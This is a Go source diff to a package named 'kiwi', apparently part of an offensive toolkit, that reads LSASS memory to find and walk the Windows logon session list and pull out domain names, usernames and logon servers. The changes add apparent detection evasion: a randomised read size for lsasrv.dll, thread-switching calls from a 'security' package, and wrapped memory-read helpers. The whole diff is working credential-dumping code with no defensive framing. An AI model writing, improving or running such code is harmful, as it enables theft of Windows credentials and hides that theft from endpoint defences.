@@ -3,7 +3,6 @@ package kiwi
 import (
 	"bytes"
 	"runtime"
-	"sync"
 	"time"
 	"unsafe"
 
@@ -12,6 +11,7 @@ import (
 
 	"project/internal/logger"
 	"project/internal/module/windows/api"
+	"project/internal/security"
 )
 
 // session is contains information about logon session list.
@@ -21,8 +21,6 @@ type session struct {
 	// address about logon session list
 	listAddr      uintptr
 	listCountAddr uintptr
-
-	mu sync.Mutex
 }
 
 func newSession(ctx *Kiwi) *session {
@@ -233,13 +231,16 @@ var (
 )
 
 func (session *session) searchAddresses(pHandle windows.Handle) error {
+	done := security.SwitchThreadAsync()
+	defer session.ctx.waitSwitchThreadAsync(done)
 	lsasrv, err := session.ctx.lsass.GetBasicModuleInfo(pHandle, "lsasrv.dll")
 	if err != nil {
 		return err
 	}
 	// read lsasrv.dll memory
-	memory := make([]byte, lsasrv.size)
-	_, err = api.ReadProcessMemory(pHandle, lsasrv.address, &memory[0], uintptr(lsasrv.size))
+	size := uintptr(lsasrv.size - (256 - session.ctx.rand.Int(256)))
+	memory := make([]byte, size)
+	_, err = api.ReadProcessMemory(pHandle, lsasrv.address, &memory[0], size)
 	if err != nil {
 		return errors.WithMessage(err, "failed to read memory about lsasrv.dll")
 	}
@@ -259,7 +260,8 @@ func (session *session) searchAddresses(pHandle windows.Handle) error {
 	// read logon session list address
 	address := lsasrv.address + uintptr(index+patch.offsets.off0)
 	var offset int32
-	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
+	size = unsafe.Sizeof(offset)
+	err = session.ctx.readMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), size)
 	if err != nil {
 		return errors.WithMessage(err, "failed to read offset about logon session list address")
 	}
@@ -267,7 +269,7 @@ func (session *session) searchAddresses(pHandle windows.Handle) error {
 	session.logf(logger.Debug, "logon session list address is 0x%X", listAddr)
 	// read logon session list count
 	address = lsasrv.address + uintptr(index+patch.offsets.off1)
-	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
+	err = session.ctx.readMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), size)
 	if err != nil {
 		return errors.WithMessage(err, "failed to read offset about logon session list count")
 	}
@@ -549,6 +551,7 @@ type lsaEnum struct {
 	offsetToLogonServer   uint32
 }
 
+// nolint:unused
 var (
 	msv10List51Struct   = msv10List51{}
 	msv10List52Struct   = msv10List52{}
@@ -698,19 +701,19 @@ type Session struct {
 }
 
 func (session *session) GetLogonSessionList(pHandle windows.Handle) ([]*Session, error) {
-	session.mu.Lock()
-	defer session.mu.Unlock()
 	if session.listAddr == 0 {
 		err := session.searchAddresses(pHandle)
 		if err != nil {
 			return nil, errors.WithMessage(err, "failed to search address about logon session list")
 		}
 	}
+	done := security.SwitchThreadAsync()
+	defer session.ctx.waitSwitchThreadAsync(done)
 	// get session list count
 	address := session.listCountAddr
 	var count uint32
 	size := unsafe.Sizeof(count)
-	_, err := api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&count)), size)
+	err := session.ctx.readMemory(pHandle, address, (*byte)(unsafe.Pointer(&count)), size)
 	if err != nil {
 		return nil, errors.WithMessage(err, "failed to read logon session list count")
 	}
@@ -731,7 +734,7 @@ func (session *session) GetLogonSessionList(pHandle windows.Handle) ([]*Session,
 		// read logon session data address
 		var addr uintptr
 		size := unsafe.Sizeof(addr)
-		_, err = api.ReadProcessMemory(pHandle, listAddr, (*byte)(unsafe.Pointer(&addr)), size)
+		err := session.ctx.readMemory(pHandle, listAddr, (*byte)(unsafe.Pointer(&addr)), size)
 		if err != nil {
 			return nil, errors.WithMessage(err, "failed to read logon session data address")
 		}
@@ -747,7 +750,7 @@ func (session *session) GetLogonSessionList(pHandle windows.Handle) ([]*Session,
 			}
 			// read logon session data
 			buf := make([]byte, enum.size)
-			_, err = api.ReadProcessMemory(pHandle, addr, &buf[0], enum.size)
+			err := session.ctx.readMemory(pHandle, addr, &buf[0], enum.size)
 			if err != nil {
 				return nil, errors.WithMessage(err, "failed to read logon session memory")
 			}
@@ -764,17 +767,17 @@ func (session *session) GetLogonSessionList(pHandle windows.Handle) ([]*Session,
 
 func (session *session) readSession(pHandle windows.Handle, buf []byte, enum *lsaEnum) (*Session, error) {
 	domainNameLus := (*api.LSAUnicodeString)(unsafe.Pointer(&buf[enum.offsetToDomainName]))
-	domainName, err := api.ReadLSAUnicodeString(pHandle, domainNameLus)
+	domainName, err := session.ctx.readLSAUnicodeString(pHandle, domainNameLus)
 	if err != nil {
 		return nil, err
 	}
 	usernameLus := (*api.LSAUnicodeString)(unsafe.Pointer(&buf[enum.offsetToUsername]))
-	username, err := api.ReadLSAUnicodeString(pHandle, usernameLus)
+	username, err := session.ctx.readLSAUnicodeString(pHandle, usernameLus)
 	if err != nil {
 		return nil, err
 	}
 	logonServerLus := (*api.LSAUnicodeString)(unsafe.Pointer(&buf[enum.offsetToLogonServer]))
-	logonServer, err := api.ReadLSAUnicodeString(pHandle, logonServerLus)
+	logonServer, err := session.ctx.readLSAUnicodeString(pHandle, logonServerLus)
 	if err != nil {
 		return nil, err
 	}
